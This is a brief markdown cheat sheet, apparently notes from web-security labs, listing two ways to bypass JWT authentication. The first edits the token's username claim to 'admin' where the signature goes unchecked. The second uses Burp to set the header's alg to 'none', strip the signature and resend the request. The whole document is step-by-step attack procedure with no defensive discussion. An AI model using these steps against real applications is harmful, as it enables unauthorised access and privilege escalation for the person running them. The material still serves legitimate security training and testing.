
# Attacking JWT Methods

## JWT authentication bypass via unverified signature

```bash
"username":"delta",  
## Change This To
"username":"admin",
```

## JWT authentication bypass via flawed signature verification

```bash
Select The Header Part From Inspecter Section In Burp
Decode Base 64
Change alg to none "alg":"none"
Click apply changes
"username":"delta",  
## Change This To
"username":"admin",
Then Remove End/signature part and send request
if fails add . at end then resend
```

